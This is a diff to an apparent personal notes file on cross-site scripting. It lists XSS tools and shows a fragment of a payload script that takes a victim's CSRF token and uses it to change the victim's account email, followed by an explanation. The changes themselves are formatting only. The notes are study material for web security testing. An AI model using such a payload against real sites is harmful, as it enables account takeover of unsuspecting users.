@@ -1,10 +1,10 @@
 ### Tools:
 
-# XSStrike
+#### XSStrike
 link:https://github.com/s0md3v/XSStrike
-# dalfox
+#### dalfox
 link:https://github.com/hahwul/dalfox
-# ezXSS
+#### ezXSS
 link:https://github.com/ssl/ezXSS
 
 ### Payloads:
@@ -37,6 +37,7 @@ function handleResponse() {
     changeReq.open('post', '/my-account/change-email', true);
     changeReq.send('csrf='+token+'&email=test@test.com')
 };
-</script>*****
+</script>****
+
 The above script will be used to change the email address of victim.The script first send a request and wait for the response,from the response it will take the 
 csrf token,use it send request to change the email address with test@test.com.
